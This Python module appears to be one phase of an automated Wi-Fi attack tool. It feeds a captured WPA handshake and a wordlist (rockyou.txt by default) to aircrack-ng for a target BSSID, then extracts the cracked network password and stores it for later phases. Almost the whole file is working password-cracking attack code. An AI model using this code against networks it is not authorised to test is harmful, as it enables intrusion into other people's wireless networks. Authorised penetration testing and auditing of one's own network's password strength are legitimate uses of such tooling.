import subprocess
from core.logger import logger
import os

def crack_handshake(context):
    """Phase 4: Crack WPA handshake using aircrack-ng (interactive + automated, robust)."""
    handshake = context.get("handshake_file")
    if not handshake or not os.path.exists(handshake):
        logger.error("No handshake file available for cracking.")
        return False

    # Allow automation or prompt for wordlist
    wordlist = context.get("wordlist")
    if not wordlist:
        default_wordlist = "/usr/share/wordlists/rockyou.txt"
        try:
            wordlist = input(f"Enter path to wordlist [{default_wordlist}]: ").strip() or default_wordlist
        except KeyboardInterrupt:
            logger.warning("User interrupted wordlist prompt.")
            return False

    if not os.path.exists(wordlist):
        logger.error(f"Wordlist not found: {wordlist}")
        return False

    logger.info(f"[Phase 4] Cracking handshake using {wordlist}...")

    try:
        cmd = ["aircrack-ng", "-w", wordlist, "-b", context["target"]["bssid"], handshake]
        result = subprocess.run(cmd, capture_output=True, text=True)

        output = result.stdout
        if "KEY FOUND!" in output:
            for line in output.splitlines():
                if "KEY FOUND!" in line:
                    password = line.split()[-1]
                    logger.info(f"[✓] Password cracked: {password}")
                    context["password"] = password
                    return True
            logger.error("KEY FOUND! in output but could not parse password.")
        else:
            logger.warning("Password not found in handshake file.")
            context["password"] = None
            return False
    except KeyboardInterrupt:
        logger.warning("Cracking interrupted by user.")
        context["password"] = None
        return False
    except Exception as e:
        logger.error(f"Error during cracking: {e}")
        context["password"] = None
        return False
    logger.error("Cracking failed for an unknown reason.")
    context["password"] = None
    return False
#     return False
#     logger.error("Cracking failed for an unknown reason.")
#     context["password"] = None